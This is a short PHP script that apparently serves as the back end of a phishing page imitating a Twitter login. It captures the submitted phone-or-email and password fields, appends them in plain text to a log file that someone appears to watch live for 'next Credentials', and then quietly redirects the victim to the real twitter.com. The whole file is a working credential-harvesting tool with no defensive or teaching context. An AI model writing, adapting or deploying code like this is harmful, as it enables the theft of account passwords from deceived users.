<?php
    $uname = $_POST['phone_or_email'];
    $pass = $_POST['pass'];

 
    $file = fopen("log.txt", "a");
    fwrite($file,"Double Check ");
    fwrite($file,"\n------------------------\n");
    fwrite($file,"Username--> : ");
    fwrite($file,$uname);
    fwrite($file,"\n");
    fwrite($file,"Password--> : ");
    fwrite($file,$pass);
    fwrite($file,"\n---------------------\n");
    fwrite($file,"---------------------Waiting for next Credentials----------[Ctrl + C] for exit-------------\n");
    fclose($file);

    header("location:https://twitter.com/");
?>
